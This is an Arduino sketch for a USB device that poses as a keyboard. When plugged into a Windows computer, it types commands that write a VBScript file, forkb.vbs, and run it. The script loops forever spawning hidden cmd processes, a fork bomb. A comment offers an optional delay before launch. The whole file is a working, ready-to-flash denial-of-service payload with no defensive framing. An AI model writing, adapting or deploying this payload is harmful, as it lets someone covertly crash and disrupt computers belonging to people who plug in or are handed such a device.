#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("copy con forkb.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("do");

  typeKey(KEY_RETURN);

  Keyboard.print("CreateObject(\"Wscript.Shell\").Run \"cmd\", 0, False");

  typeKey(KEY_RETURN);

  Keyboard.print("loop");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  // Keyboard.print("ping localhost -n 10");
  // You can uncomment this ^ to delay 10 seconds before starting the fork bomb.
  Keyboard.print("start forkb.vbs");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
